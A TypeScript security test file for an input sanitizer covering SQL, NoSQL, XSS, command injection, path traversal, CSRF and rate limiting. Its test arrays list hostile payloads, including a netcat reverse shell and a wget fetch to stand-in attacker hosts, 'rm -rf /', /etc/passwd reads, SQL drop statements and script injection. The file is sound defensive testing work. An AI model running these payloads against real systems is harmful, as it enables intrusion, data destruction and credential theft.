/**
 * Injection Security Tests
 * Story test-5 - Security Testing
 *
 * Tests cover:
 * - SQL injection prevention
 * - NoSQL injection prevention
 * - XSS prevention
 * - Command injection prevention
 * - LDAP injection prevention
 * - Path traversal prevention
 *
 * @module tests/security/injection
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';

// ============================================================================
// Input Sanitization Service (Under Test)
// ============================================================================

/**
 * Input Sanitization and Validation Service
 * Provides protection against various injection attacks
 */
class InputSanitizer {
  /**
   * Escape special characters for SQL queries
   * Note: In production, use parameterized queries instead
   */
  static escapeSql(input: string): string {
    if (typeof input !== 'string') {
      return String(input);
    }

    return input
      .replace(/'/g, "''")
      .replace(/\\/g, '\\\\')
      .replace(/\x00/g, '\\0')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\x1a/g, '\\Z');
  }

  /**
   * Detect potential SQL injection patterns
   */
  static detectSqlInjection(input: string): boolean {
    if (typeof input !== 'string') {
      return false;
    }

    const sqlPatterns = [
      /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE|TRUNCATE)\b)/i,
      /(\b(OR|AND)\s+\d+\s*=\s*\d+)/i,
      /('|")\s*(OR|AND)\s*('|")/i,
      /(;|\-\-|\/\*|\*\/|@@|@)/,
      /(\bEXEC\b|\bEXECUTE\b)/i,
      /(\bxp_|\bsp_)/i,
      /(WAITFOR\s+DELAY)/i,
      /(BENCHMARK\s*\()/i,
      /(SLEEP\s*\()/i,
    ];

    return sqlPatterns.some((pattern) => pattern.test(input));
  }

  /**
   * Sanitize for HTML/XSS prevention
   */
  static escapeHtml(input: string): string {
    if (typeof input !== 'string') {
      return String(input);
    }

    const htmlEscapes: Record<string, string> = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '/': '&#x2F;',
      '`': '&#x60;',
      '=': '&#x3D;',
    };

    return input.replace(/[&<>"'`=/]/g, (char) => htmlEscapes[char] || char);
  }

  /**
   * Detect potential XSS patterns
   */
  static detectXss(input: string): boolean {
    if (typeof input !== 'string') {
      return false;
    }

    const xssPatterns = [
      /<script\b[^>]*>/i,
      /<\/script>/i,
      /javascript\s*:/i,
      /on\w+\s*=/i,
      /<iframe\b/i,
      /<object\b/i,
      /<embed\b/i,
      /<link\b/i,
      /<style\b/i,
      /<img\b[^>]*\bonerror\b/i,
      /<svg\b[^>]*\bonload\b/i,
      /expression\s*\(/i,
      /url\s*\(\s*['"]*\s*javascript/i,
      /data\s*:\s*text\/html/i,
      /vbscript\s*:/i,
    ];

    return xssPatterns.some((pattern) => pattern.test(input));
  }

  /**
   * Sanitize for NoSQL (MongoDB) injection prevention
   */
  static sanitizeNoSql(input: any): any {
    if (typeof input === 'string') {
      // Remove MongoDB operators
      return input.replace(/\$[a-zA-Z]+/g, '');
    }

    if (typeof input === 'object' && input !== null) {
      // Check for dangerous MongoDB operators
      const dangerousKeys = ['$where', '$regex', '$gt', '$gte', '$lt', '$lte', '$ne', '$in', '$nin', '$or', '$and', '$not'];

      for (const key of Object.keys(input)) {
        if (dangerousKeys.includes(key)) {
          delete input[key];
        }
      }
    }

    return input;
  }

  /**
   * Detect NoSQL injection patterns
   */
  static detectNoSqlInjection(input: any): boolean {
    if (typeof input === 'string') {
      return /\$[a-zA-Z]+/.test(input);
    }

    if (typeof input === 'object' && input !== null) {
      const dangerousKeys = ['$where', '$regex', '$gt', '$gte', '$lt', '$lte', '$ne', '$in', '$nin', '$or', '$and', '$not', '$expr', '$function'];

      return Object.keys(input).some((key) => dangerousKeys.includes(key));
    }

    return false;
  }

  /**
   * Sanitize for command injection prevention
   */
  static sanitizeCommand(input: string): string {
    if (typeof input !== 'string') {
      return String(input);
    }

    // Remove/escape shell metacharacters
    return input
      .replace(/[;&|`$(){}[\]<>\\!]/g, '')
      .replace(/\n/g, '')
      .replace(/\r/g, '');
  }

  /**
   * Detect command injection patterns
   */
  static detectCommandInjection(input: string): boolean {
    if (typeof input !== 'string') {
      return false;
    }

    const commandPatterns = [
      /[;&|`$]/,
      /\$\([^)]+\)/,
      /`[^`]+`/,
      /\|\|/,
      /&&/,
      />\s*\/dev\/null/,
      /\|\s*\/bin\//,
      /;\s*(cat|ls|rm|wget|curl|nc|bash|sh)/i,
      /\$\{[^}]+\}/,
    ];

    return commandPatterns.some((pattern) => pattern.test(input));
  }

  /**
   * Sanitize file paths to prevent path traversal
   */
  static sanitizePath(input: string): string {
    if (typeof input !== 'string') {
      return String(input);
    }

    return input
      .replace(/\.\.\//g, '')
      .replace(/\.\./g, '')
      .replace(/\/\//g, '/')
      .replace(/^\//, '')
      .replace(/\x00/g, '');
  }

  /**
   * Detect path traversal patterns
   */
  static detectPathTraversal(input: string): boolean {
    if (typeof input !== 'string') {
      return false;
    }

    const pathPatterns = [
      /\.\.\//,
      /\.\.\\/,
      /\.\.$/,
      /%2e%2e/i,
      /%252e%252e/i,
      /\x00/,
      /^\/etc\//,
      /^\/proc\//,
      /^\/sys\//,
      /^C:\\/i,
    ];

    return pathPatterns.some((pattern) => pattern.test(input));
  }

  /**
   * Validate and sanitize email
   */
  static sanitizeEmail(input: string): string | null {
    if (typeof input !== 'string') {
      return null;
    }

    const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;

    const trimmed = input.trim().toLowerCase();

    if (!emailRegex.test(trimmed)) {
      return null;
    }

    return trimmed;
  }

  /**
   * Sanitize JSON input
   */
  static sanitizeJson(input: string): object | null {
    try {
      const parsed = JSON.parse(input);

      // Recursively sanitize object values
      const sanitize = (obj: any): any => {
        if (typeof obj === 'string') {
          return this.escapeHtml(obj);
        }

        if (Array.isArray(obj)) {
          return obj.map(sanitize);
        }

        if (typeof obj === 'object' && obj !== null) {
          const result: Record<string, any> = {};
          for (const [key, value] of Object.entries(obj)) {
            // Sanitize keys too
            const sanitizedKey = this.escapeHtml(key);
            result[sanitizedKey] = sanitize(value);
          }
          return result;
        }

        return obj;
      };

      return sanitize(parsed);
    } catch {
      return null;
    }
  }
}

// ============================================================================
// SQL Injection Tests
// ============================================================================

describe('SQL Injection Prevention', () => {
  describe('Detection', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "1' OR '1' = '1",
      "admin'--",
      "1; SELECT * FROM users",
      "' UNION SELECT * FROM passwords--",
      "1' AND 1=1 --",
      "' OR 1=1#",
      "1'; EXEC xp_cmdshell('dir'); --",
      "'; WAITFOR DELAY '0:0:10'--",
      "1' AND BENCHMARK(10000000,SHA1('test'))--",
      "1' AND SLEEP(5)--",
      "@@version",
      "1; INSERT INTO users VALUES('hacker', 'password')",
      "' OR '' = '",
    ];

    it.each(sqlInjectionPayloads)('should detect SQL injection: %s', (payload) => {
      expect(InputSanitizer.detectSqlInjection(payload)).toBe(true);
    });

    const safeInputs = [
      'John Doe',
      'user@example.com',
      '123 Main Street',
      'Hello, World!',
      'Product name with special chars: @#$%',
      "O'Brien", // Valid name with apostrophe
    ];

    it.each(safeInputs)('should allow safe input: %s', (input) => {
      expect(InputSanitizer.detectSqlInjection(input)).toBe(false);
    });
  });

  describe('Escaping', () => {
    it('should escape single quotes', () => {
      const input = "O'Brien";
      const escaped = InputSanitizer.escapeSql(input);
      expect(escaped).toBe("O''Brien");
    });

    it('should escape backslashes', () => {
      const input = 'path\\to\\file';
      const escaped = InputSanitizer.escapeSql(input);
      expect(escaped).toBe('path\\\\to\\\\file');
    });

    it('should escape null bytes', () => {
      const input = 'test\x00value';
      const escaped = InputSanitizer.escapeSql(input);
      expect(escaped).toBe('test\\0value');
    });

    it('should escape newlines', () => {
      const input = 'line1\nline2';
      const escaped = InputSanitizer.escapeSql(input);
      expect(escaped).toBe('line1\\nline2');
    });

    it('should handle non-string input', () => {
      expect(InputSanitizer.escapeSql(123 as any)).toBe('123');
      expect(InputSanitizer.escapeSql(null as any)).toBe('null');
    });
  });
});

// ============================================================================
// XSS Prevention Tests
// ============================================================================

describe('XSS Prevention', () => {
  describe('Detection', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert(1)',
      '<a href="javascript:alert(1)">click</a>',
      '<iframe src="evil.com">',
      '<object data="evil.swf">',
      '<embed src="evil.swf">',
      '<link rel="stylesheet" href="evil.css">',
      '<style>body{background:url("javascript:alert(1)")}</style>',
      '<div onclick="alert(1)">click me</div>',
      '<body onload="alert(1)">',
      'expression(alert(1))',
      'url(javascript:alert(1))',
      '<img src="data:text/html,<script>alert(1)</script>">',
      '<a href="vbscript:msgbox(1)">click</a>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      "'-alert(1)-'",
      '<ScRiPt>alert(1)</ScRiPt>',
      '<img/src="x"/onerror="alert(1)">',
    ];

    it.each(xssPayloads)('should detect XSS: %s', (payload) => {
      expect(InputSanitizer.detectXss(payload)).toBe(true);
    });

    const safeInputs = [
      'Hello, World!',
      'This is a <normal> test',
      'Email: user@example.com',
      '2 + 2 = 4',
      'Use code `alert()` for debugging',
    ];

    it.each(safeInputs)('should allow safe input: %s', (input) => {
      expect(InputSanitizer.detectXss(input)).toBe(false);
    });
  });

  describe('HTML Escaping', () => {
    it('should escape angle brackets', () => {
      const input = '<script>alert(1)</script>';
      const escaped = InputSanitizer.escapeHtml(input);
      expect(escaped).toBe('&lt;script&gt;alert(1)&lt;&#x2F;script&gt;');
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
    });

    it('should escape quotes', () => {
      const input = '"test" and \'test\'';
      const escaped = InputSanitizer.escapeHtml(input);
      expect(escaped).toBe('&quot;test&quot; and &#x27;test&#x27;');
    });

    it('should escape ampersand', () => {
      const input = 'a & b';
      const escaped = InputSanitizer.escapeHtml(input);
      expect(escaped).toBe('a &amp; b');
    });

    it('should escape backticks and equals', () => {
      const input = '`code` = result';
      const escaped = InputSanitizer.escapeHtml(input);
      expect(escaped).toBe('&#x60;code&#x60; &#x3D; result');
    });

    it('should handle complex XSS payloads', () => {
      const input = '<img src="x" onerror="alert(\'XSS\')">';
      const escaped = InputSanitizer.escapeHtml(input);
      expect(escaped).not.toContain('<img');
      expect(escaped).not.toContain('onerror');
    });
  });
});

// ============================================================================
// NoSQL Injection Tests
// ============================================================================

describe('NoSQL Injection Prevention', () => {
  describe('Detection', () => {
    it('should detect MongoDB $where operator', () => {
      const input = { $where: 'this.password == "test"' };
      expect(InputSanitizer.detectNoSqlInjection(input)).toBe(true);
    });

    it('should detect MongoDB $gt operator', () => {
      const input = { password: { $gt: '' } };
      expect(InputSanitizer.detectNoSqlInjection(input.password)).toBe(true);
    });

    it('should detect $regex operator', () => {
      const input = { username: { $regex: '.*' } };
      expect(InputSanitizer.detectNoSqlInjection(input.username)).toBe(true);
    });

    it('should detect $ne operator', () => {
      const input = { password: { $ne: null } };
      expect(InputSanitizer.detectNoSqlInjection(input.password)).toBe(true);
    });

    it('should detect operator in string', () => {
      const input = '{"$gt": ""}';
      expect(InputSanitizer.detectNoSqlInjection(input)).toBe(true);
    });

    it('should allow safe objects', () => {
      const input = { username: 'john', password: 'secret123' };
      expect(InputSanitizer.detectNoSqlInjection(input)).toBe(false);
    });
  });

  describe('Sanitization', () => {
    it('should remove $where operator', () => {
      const input = { $where: 'malicious', username: 'john' };
      const sanitized = InputSanitizer.sanitizeNoSql(input);
      expect(sanitized.$where).toBeUndefined();
      expect(sanitized.username).toBe('john');
    });

    it('should remove $gt operator from nested object', () => {
      const input = { $gt: '', username: 'john' };
      const sanitized = InputSanitizer.sanitizeNoSql(input);
      expect(sanitized.$gt).toBeUndefined();
    });

    it('should strip operators from strings', () => {
      const input = '$where: this.a == this.b';
      const sanitized = InputSanitizer.sanitizeNoSql(input);
      expect(sanitized).not.toContain('$where');
    });
  });
});

// ============================================================================
// Command Injection Tests
// ============================================================================

describe('Command Injection Prevention', () => {
  describe('Detection', () => {
    const commandInjectionPayloads = [
      '; rm -rf /',
      '| cat /etc/passwd',
      '& wget malicious.com/shell.sh',
      '`id`',
      '$(whoami)',
      '|| ls -la',
      '&& curl attacker.com',
      '> /dev/null',
      '| /bin/sh',
      '; nc -e /bin/sh attacker.com 4444',
      '${IFS}cat${IFS}/etc/passwd',
      "`curl attacker.com`",
    ];

    it.each(commandInjectionPayloads)('should detect command injection: %s', (payload) => {
      expect(InputSanitizer.detectCommandInjection(payload)).toBe(true);
    });

    const safeInputs = [
      'filename.txt',
      'my-file-2024',
      'report_final',
      'data.json',
    ];

    it.each(safeInputs)('should allow safe input: %s', (input) => {
      expect(InputSanitizer.detectCommandInjection(input)).toBe(false);
    });
  });

  describe('Sanitization', () => {
    it('should remove semicolons', () => {
      const input = '; rm -rf /';
      const sanitized = InputSanitizer.sanitizeCommand(input);
      expect(sanitized).not.toContain(';');
    });

    it('should remove pipes', () => {
      const input = '| cat /etc/passwd';
      const sanitized = InputSanitizer.sanitizeCommand(input);
      expect(sanitized).not.toContain('|');
    });

    it('should remove backticks', () => {
      const input = '`whoami`';
      const sanitized = InputSanitizer.sanitizeCommand(input);
      expect(sanitized).not.toContain('`');
    });

    it('should remove dollar signs', () => {
      const input = '$(id)';
      const sanitized = InputSanitizer.sanitizeCommand(input);
      expect(sanitized).not.toContain('$');
    });

    it('should remove ampersands', () => {
      const input = '&& curl attacker.com';
      const sanitized = InputSanitizer.sanitizeCommand(input);
      expect(sanitized).not.toContain('&');
    });

    it('should remove newlines', () => {
      const input = 'test\nrm -rf /';
      const sanitized = InputSanitizer.sanitizeCommand(input);
      expect(sanitized).not.toContain('\n');
    });
  });
});

// ============================================================================
// Path Traversal Tests
// ============================================================================

describe('Path Traversal Prevention', () => {
  describe('Detection', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f',
      '%252e%252e%252f',
      '/etc/passwd',
      '/proc/self/environ',
      'C:\\Windows\\System32',
      'file\x00name.txt',
      '..%00/etc/passwd',
    ];

    it.each(pathTraversalPayloads)('should detect path traversal: %s', (payload) => {
      expect(InputSanitizer.detectPathTraversal(payload)).toBe(true);
    });

    const safePaths = [
      'documents/report.pdf',
      'images/logo.png',
      'uploads/user-123/avatar.jpg',
      'data.json',
    ];

    it.each(safePaths)('should allow safe path: %s', (input) => {
      expect(InputSanitizer.detectPathTraversal(input)).toBe(false);
    });
  });

  describe('Sanitization', () => {
    it('should remove ../ sequences', () => {
      const input = '../../../etc/passwd';
      const sanitized = InputSanitizer.sanitizePath(input);
      expect(sanitized).not.toContain('../');
      expect(sanitized).toBe('etc/passwd');
    });

    it('should remove standalone ..', () => {
      const input = '..';
      const sanitized = InputSanitizer.sanitizePath(input);
      expect(sanitized).toBe('');
    });

    it('should remove leading slashes', () => {
      const input = '/etc/passwd';
      const sanitized = InputSanitizer.sanitizePath(input);
      expect(sanitized).toBe('etc/passwd');
      expect(sanitized).not.toMatch(/^\//);
    });

    it('should remove double slashes', () => {
      const input = 'path//to//file';
      const sanitized = InputSanitizer.sanitizePath(input);
      expect(sanitized).toBe('path/to/file');
    });

    it('should remove null bytes', () => {
      const input = 'file\x00.txt';
      const sanitized = InputSanitizer.sanitizePath(input);
      expect(sanitized).not.toContain('\x00');
    });
  });
});

// ============================================================================
// Email Validation Tests
// ============================================================================

describe('Email Validation', () => {
  describe('Valid Emails', () => {
    const validEmails = [
      'user@example.com',
      'user.name@example.com',
      'user+tag@example.com',
      'user@subdomain.example.com',
      'user123@example.co.uk',
    ];

    it.each(validEmails)('should accept valid email: %s', (email) => {
      const result = InputSanitizer.sanitizeEmail(email);
      expect(result).not.toBeNull();
      expect(result).toBe(email.toLowerCase());
    });
  });

  describe('Invalid Emails', () => {
    const invalidEmails = [
      'not-an-email',
      '@example.com',
      'user@',
      'user@.com',
      'user space@example.com',
      '<script>alert(1)</script>@example.com',
      'user@example.com<script>',
    ];

    it.each(invalidEmails)('should reject invalid email: %s', (email) => {
      const result = InputSanitizer.sanitizeEmail(email);
      expect(result).toBeNull();
    });
  });

  it('should handle non-string input', () => {
    expect(InputSanitizer.sanitizeEmail(null as any)).toBeNull();
    expect(InputSanitizer.sanitizeEmail(undefined as any)).toBeNull();
    expect(InputSanitizer.sanitizeEmail(123 as any)).toBeNull();
  });
});

// ============================================================================
// JSON Sanitization Tests
// ============================================================================

describe('JSON Sanitization', () => {
  it('should sanitize string values in JSON', () => {
    const input = JSON.stringify({
      name: '<script>alert(1)</script>',
      description: 'Test <b>bold</b>',
    });

    const result = InputSanitizer.sanitizeJson(input);

    expect(result).not.toBeNull();
    expect((result as any).name).not.toContain('<script>');
    expect((result as any).description).not.toContain('<b>');
  });

  it('should sanitize nested objects', () => {
    const input = JSON.stringify({
      user: {
        name: '<img onerror="alert(1)">',
        profile: {
          bio: 'javascript:alert(1)',
        },
      },
    });

    const result = InputSanitizer.sanitizeJson(input);

    expect(result).not.toBeNull();
    expect((result as any).user.name).not.toContain('<img');
    expect((result as any).user.profile.bio).not.toContain('javascript:');
  });

  it('should sanitize arrays', () => {
    const input = JSON.stringify({
      tags: ['<script>evil</script>', 'normal', '<img onerror=alert(1)>'],
    });

    const result = InputSanitizer.sanitizeJson(input);

    expect(result).not.toBeNull();
    expect((result as any).tags[0]).not.toContain('<script>');
    expect((result as any).tags[1]).toBe('normal');
    expect((result as any).tags[2]).not.toContain('<img');
  });

  it('should handle invalid JSON', () => {
    const result = InputSanitizer.sanitizeJson('not valid json');
    expect(result).toBeNull();
  });

  it('should preserve non-string values', () => {
    const input = JSON.stringify({
      count: 42,
      active: true,
      score: 3.14,
      data: null,
    });

    const result = InputSanitizer.sanitizeJson(input);

    expect(result).not.toBeNull();
    expect((result as any).count).toBe(42);
    expect((result as any).active).toBe(true);
    expect((result as any).score).toBe(3.14);
    expect((result as any).data).toBeNull();
  });
});

// ============================================================================
// Rate Limiting Tests (for brute force prevention)
// ============================================================================

describe('Rate Limiting', () => {
  /**
   * Simple rate limiter for testing
   */
  class RateLimiter {
    private requests: Map<string, number[]> = new Map();
    private windowMs: number;
    private maxRequests: number;

    constructor(windowMs: number = 60000, maxRequests: number = 100) {
      this.windowMs = windowMs;
      this.maxRequests = maxRequests;
    }

    isAllowed(key: string): boolean {
      const now = Date.now();
      const windowStart = now - this.windowMs;

      let timestamps = this.requests.get(key) || [];

      // Remove old timestamps
      timestamps = timestamps.filter((t) => t > windowStart);

      if (timestamps.length >= this.maxRequests) {
        return false;
      }

      timestamps.push(now);
      this.requests.set(key, timestamps);

      return true;
    }

    getRemainingRequests(key: string): number {
      const now = Date.now();
      const windowStart = now - this.windowMs;

      let timestamps = this.requests.get(key) || [];
      timestamps = timestamps.filter((t) => t > windowStart);

      return Math.max(0, this.maxRequests - timestamps.length);
    }

    reset(key: string): void {
      this.requests.delete(key);
    }
  }

  let rateLimiter: RateLimiter;

  beforeEach(() => {
    rateLimiter = new RateLimiter(1000, 5); // 5 requests per second for testing
  });

  it('should allow requests under limit', () => {
    for (let i = 0; i < 5; i++) {
      expect(rateLimiter.isAllowed('user-1')).toBe(true);
    }
  });

  it('should block requests over limit', () => {
    for (let i = 0; i < 5; i++) {
      rateLimiter.isAllowed('user-2');
    }

    expect(rateLimiter.isAllowed('user-2')).toBe(false);
  });

  it('should track remaining requests', () => {
    expect(rateLimiter.getRemainingRequests('user-3')).toBe(5);

    rateLimiter.isAllowed('user-3');
    rateLimiter.isAllowed('user-3');

    expect(rateLimiter.getRemainingRequests('user-3')).toBe(3);
  });

  it('should isolate rate limits per key', () => {
    for (let i = 0; i < 5; i++) {
      rateLimiter.isAllowed('user-a');
    }

    // User A is blocked
    expect(rateLimiter.isAllowed('user-a')).toBe(false);

    // User B is not affected
    expect(rateLimiter.isAllowed('user-b')).toBe(true);
  });

  it('should reset limits after window expires', async () => {
    for (let i = 0; i < 5; i++) {
      rateLimiter.isAllowed('user-4');
    }

    expect(rateLimiter.isAllowed('user-4')).toBe(false);

    // Wait for window to expire
    await new Promise((resolve) => setTimeout(resolve, 1100));

    expect(rateLimiter.isAllowed('user-4')).toBe(true);
  });

  it('should allow manual reset', () => {
    for (let i = 0; i < 5; i++) {
      rateLimiter.isAllowed('user-5');
    }

    expect(rateLimiter.isAllowed('user-5')).toBe(false);

    rateLimiter.reset('user-5');

    expect(rateLimiter.isAllowed('user-5')).toBe(true);
  });
});

// ============================================================================
// CSRF Protection Tests
// ============================================================================

describe('CSRF Protection', () => {
  /**
   * Simple CSRF token manager
   */
  class CsrfTokenManager {
    private tokens: Map<string, { token: string; expires: number }> = new Map();
    private tokenExpiry: number;

    constructor(tokenExpiry: number = 3600000) {
      this.tokenExpiry = tokenExpiry;
    }

    generateToken(sessionId: string): string {
      const crypto = require('crypto');
      const token = crypto.randomBytes(32).toString('hex');
      const expires = Date.now() + this.tokenExpiry;

      this.tokens.set(sessionId, { token, expires });

      return token;
    }

    validateToken(sessionId: string, token: string): boolean {
      const stored = this.tokens.get(sessionId);

      if (!stored) {
        return false;
      }

      if (stored.expires < Date.now()) {
        this.tokens.delete(sessionId);
        return false;
      }

      return stored.token === token;
    }

    invalidateToken(sessionId: string): void {
      this.tokens.delete(sessionId);
    }
  }

  let csrfManager: CsrfTokenManager;

  beforeEach(() => {
    csrfManager = new CsrfTokenManager(5000); // 5 second expiry for testing
  });

  it('should generate unique tokens', () => {
    const token1 = csrfManager.generateToken('session-1');
    const token2 = csrfManager.generateToken('session-2');

    expect(token1).not.toBe(token2);
    expect(token1.length).toBe(64); // 32 bytes = 64 hex chars
  });

  it('should validate correct token', () => {
    const token = csrfManager.generateToken('session-1');

    expect(csrfManager.validateToken('session-1', token)).toBe(true);
  });

  it('should reject incorrect token', () => {
    csrfManager.generateToken('session-1');

    expect(csrfManager.validateToken('session-1', 'wrong-token')).toBe(false);
  });

  it('should reject token for different session', () => {
    const token = csrfManager.generateToken('session-1');

    expect(csrfManager.validateToken('session-2', token)).toBe(false);
  });

  it('should reject expired token', async () => {
    const token = csrfManager.generateToken('session-1');

    // Wait for expiry
    await new Promise((resolve) => setTimeout(resolve, 5100));

    expect(csrfManager.validateToken('session-1', token)).toBe(false);
  });

  it('should allow token invalidation', () => {
    const token = csrfManager.generateToken('session-1');

    expect(csrfManager.validateToken('session-1', token)).toBe(true);

    csrfManager.invalidateToken('session-1');

    expect(csrfManager.validateToken('session-1', token)).toBe(false);
  });
});
